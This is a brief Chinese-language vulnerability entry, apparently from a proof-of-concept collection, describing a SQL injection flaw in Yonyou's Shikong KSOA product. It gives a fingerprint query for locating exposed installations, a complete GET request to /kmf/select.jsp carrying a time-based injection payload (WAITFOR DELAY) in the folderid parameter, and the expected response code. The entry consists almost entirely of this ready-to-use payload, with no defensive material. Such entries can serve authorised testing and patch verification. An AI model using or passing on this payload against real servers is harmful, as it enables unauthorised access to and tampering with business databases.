# 用友时空KSOAselect存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /kmf/select.jsp?folderid=%27%3bWAITFOR+DELAY+%270%3a0%3a5%27-- HTTP/1.1`
- **响应特征**：200